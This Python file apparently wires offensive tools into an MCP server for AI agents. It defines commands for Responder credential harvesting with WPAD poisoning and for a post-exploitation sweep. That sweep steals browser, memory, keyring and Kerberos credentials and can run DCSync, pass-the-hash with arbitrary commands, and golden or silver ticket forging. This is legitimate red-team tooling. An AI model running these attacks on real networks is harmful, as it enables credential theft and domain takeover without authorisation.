import shlex

from server_core.tool_spec import ParamSpec, ToolSpec, ToolValidationError


def _bool(val) -> bool:
    """Coerce UI values to bool. Handles True/False, 'true'/'false', 1/0."""
    if isinstance(val, bool):
        return val
    if isinstance(val, str):
        return val.lower() == "true"
    return bool(val)


def _responder_command(p: dict) -> str:
    if not p["interface"]:
        raise ToolValidationError("Interface parameter is required")

    argv = ["timeout", str(p["duration"]), "responder", "-I", p["interface"]]
    if p["analyze"]:
        argv.append("-A")
    if p["wpad"]:
        argv.append("-w")
    if p["force_wpad_auth"]:
        argv.append("-F")
    if p["fingerprint"]:
        argv.append("-f")
    if p["additional_args"]:
        argv.extend(shlex.split(p["additional_args"]))
    return shlex.join(argv)


def _vaultrip_command(p: dict) -> str:
    argv = ["vaultrip", p["target"]]

    if not _bool(p["local"]):
        argv.append("--no-local")
    if not _bool(p["memory"]):
        argv.append("--no-memory")
    if not _bool(p["browser"]):
        argv.append("--no-browser")
    if not _bool(p["system"]):
        argv.append("--no-system")
    if not _bool(p["kerberos"]):
        argv.append("--no-kerberos")

    if p["dump_path"]:
        argv.append("--dumps")
        argv.append(p["dump_path"])

    if p["target_user"]:
        argv.append("--user")
        argv.append(p["target_user"])

    if p["target_pid"]:
        argv.append("--pid")
        argv.append(str(int(p["target_pid"])))

    if _bool(p["remote"]):
        if p["ssh_host"]:
            argv.append("--remote")
            argv.append(p["ssh_host"])
        if p["ssh_user"]:
            argv.append("--ssh-user")
            argv.append(p["ssh_user"])
        if p["ssh_key"]:
            argv.append("--ssh-key")
            argv.append(p["ssh_key"])
        if p["ssh_password"]:
            argv.append("--ssh-pass")
            argv.append(p["ssh_password"])
        if p["ssh_port"] and int(p["ssh_port"]) != 22:
            argv.append("--ssh-port")
            argv.append(str(int(p["ssh_port"])))

    if _bool(p["verbose"]):
        argv.append("-v")

    if p["timeout"] and int(p["timeout"]) != 30:
        argv.append("--timeout")
        argv.append(str(int(p["timeout"])))

    # Active attack modules — explicit opt-in
    if _bool(p["dcsync"]):
        argv.append("--dcsync")

    if _bool(p["pth"]):
        argv.append("--pth")

    if _bool(p["ptt"]):
        if p["ptt_ticket"]:
            argv.append("--ptt")
            argv.append("--ptt-ticket")
            argv.append(p["ptt_ticket"])

    if _bool(p["forge_golden"]):
        argv.append("--forge-golden")

    if _bool(p["forge_silver"]):
        if p["forge_silver_spn"]:
            argv.append("--forge-silver")
            argv.append("--forge-silver-spn")
            argv.append(p["forge_silver_spn"])

    if p["dc_host"]:
        argv.append("--dc")
        argv.append(p["dc_host"])

    if p["ad_domain"]:
        argv.append("--domain")
        argv.append(p["ad_domain"])

    if p["domain_sid"]:
        argv.append("--domain-sid")
        argv.append(p["domain_sid"])

    if p["krbtgt_hash"]:
        argv.append("--krbtgt-hash")
        argv.append(p["krbtgt_hash"])

    if p["attack_user"]:
        argv.append("--attack-user")
        argv.append(p["attack_user"])

    if p["attack_hash"]:
        argv.append("--attack-hash")
        argv.append(p["attack_hash"])

    if p["attack_cmd"] and p["attack_cmd"] != "whoami":
        argv.append("--attack-cmd")
        argv.append(p["attack_cmd"])

    if p["additional_args"]:
        argv.extend(shlex.split(p["additional_args"]))

    return shlex.join(argv)


def _vaultrip_postprocess(raw: dict, p: dict) -> dict:
    # Exit code 1 = findings found (not an error) — treat as success
    if raw.get("return_code") == 1:
        raw["success"] = True
    return raw


SPECS = [
    ToolSpec(
        name="responder",
        mcp_tool_name="responder_credential_harvest",
        endpoint="/api/tools/responder",
        category="credential_harvest",
        description="Execute Responder for credential harvesting with enhanced logging.",
        params=[
            ParamSpec("interface", str, default="eth0", help_text="Network interface to use"),
            ParamSpec("analyze", bool, default=False, help_text="Analyze mode only"),
            ParamSpec("wpad", bool, default=True, help_text="Enable WPAD rogue proxy"),
            ParamSpec("force_wpad_auth", bool, default=False, help_text="Force WPAD authentication"),
            ParamSpec("fingerprint", bool, default=False, help_text="Fingerprint mode"),
            ParamSpec("duration", int, default=300, help_text="Duration to run in seconds"),
            ParamSpec("additional_args", str, default="", help_text="Additional Responder arguments"),
        ],
        build_command=_responder_command,
    ),
    ToolSpec(
        name="vaultrip",
        mcp_tool_name="vaultrip_sweep",
        endpoint="/api/tools/vaultrip",
        category="credential_harvest",
        description="Run VaultRip post-exploitation credential harvesting sweep.",
        params=[
            ParamSpec("target", str, default="~", help_text="Root directory to sweep (default \"~\" = current user's home)"),
            ParamSpec("local", bool, default=True, help_text="Sweep filesystem for credential files"),
            ParamSpec("memory", bool, default=True, help_text="Scan /proc/*/mem for credentials in process memory (Linux only)"),
            ParamSpec("browser", bool, default=True, help_text="Extract saved credentials from Chrome, Firefox, Edge, Brave"),
            ParamSpec("system", bool, default=True, help_text="Query GNOME keyring, kwallet, git-credentials, Docker, .pgpass"),
            ParamSpec("kerberos", bool, default=True, help_text="Extract ccache and keytab Kerberos tickets"),
            ParamSpec("dump_path", str, default="", help_text="Path to an offline dump file for analysis (LSASS/SAM/NTDS.dit)"),
            ParamSpec("target_user", str, default="", help_text="Filter credential sweep to a specific user"),
            ParamSpec("target_pid", int, default=0, help_text="Filter memory scan to a specific process ID"),
            ParamSpec("remote", bool, default=False, help_text="Harvest credentials via SSH from a remote host"),
            ParamSpec("ssh_host", str, default="", help_text="Remote host IP or hostname (requires remote=True)"),
            ParamSpec("ssh_user", str, default="", help_text="SSH username"),
            ParamSpec("ssh_key", str, default="", help_text="Path to SSH private key file"),
            ParamSpec("ssh_password", str, default="", help_text="SSH password (prefer key-based auth)"),
            ParamSpec("ssh_port", int, default=22, help_text="SSH port (default 22)"),
            ParamSpec("verbose", bool, default=False, help_text="Include extracted credential values in the output"),
            ParamSpec("timeout", int, default=30, help_text="Per-module timeout in seconds"),
            ParamSpec("dcsync", bool, default=False,
                      help_text="Replicate all AD credentials via DRSUAPI (requires dc_host, ad_domain, attack_hash)"),
            ParamSpec("pth", bool, default=False,
                      help_text="Execute a command on a Windows host via Pass-the-Hash (requires dc_host, attack_hash)"),
            ParamSpec("ptt", bool, default=False,
                      help_text="Inject a ccache into the current session via Pass-the-Ticket (requires ptt_ticket)"),
            ParamSpec("ptt_ticket", str, default="", help_text="Path to .ccache or .kirbi file for Pass-the-Ticket injection"),
            ParamSpec("forge_golden", bool, default=False,
                      help_text="Forge a Kerberos golden ticket (requires ad_domain, domain_sid, krbtgt_hash)"),
            ParamSpec("forge_silver", bool, default=False,
                      help_text="Forge a Kerberos silver ticket (requires ad_domain, domain_sid, attack_hash, forge_silver_spn)"),
            ParamSpec("forge_silver_spn", str, default="",
                      help_text="Service Principal Name for silver ticket (e.g. cifs/server.corp.local)"),
            ParamSpec("dc_host", str, default="", help_text="Domain controller IP or hostname"),
            ParamSpec("ad_domain", str, default="", help_text="Active Directory domain name (e.g. corp.local)"),
            ParamSpec("domain_sid", str, default="", help_text="Domain SID (S-1-5-21-...)"),
            ParamSpec("krbtgt_hash", str, default="", help_text="NT hash of the krbtgt account (golden ticket forging)"),
            ParamSpec("attack_user", str, default="", help_text="Username to impersonate in forged tickets or PTH"),
            ParamSpec("attack_hash", str, default="", help_text="NT hash for PTH / silver ticket"),
            ParamSpec("attack_cmd", str, default="whoami", help_text="Command to run after Pass-the-Hash (default: whoami)"),
            ParamSpec("additional_args", str, default="", help_text="Additional VaultRip arguments"),
        ],
        build_command=_vaultrip_command,
        postprocess=_vaultrip_postprocess,
    ),
]
